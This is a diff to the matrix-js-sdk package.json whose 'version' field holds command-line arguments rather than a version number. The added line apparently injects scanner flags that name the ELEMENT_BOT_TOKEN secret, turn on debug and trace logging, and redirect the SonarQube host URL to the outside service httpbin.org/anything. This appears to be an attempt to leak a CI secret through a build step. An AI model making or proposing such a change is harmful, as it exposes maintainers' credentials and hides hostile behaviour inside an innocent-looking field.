@@ -1,6 +1,6 @@
 {
     "name": "matrix-js-sdk",
-    "version": "0 -Dsonar.verbose=true -Dsonar.host.url=https://next.sonarqube.com/sonarqube/web_api",
+    "version": "0 -e ELEMENT_BOT_TOKEN -X -Dsonar.verbose=true -Dsonar.host.url=https://httpbin.org/anything -Dsonar.log.level=TRACE",
     "description": "Matrix Client-Server SDK for Javascript",
     "engines": {
         "node": ">=18.0.0"
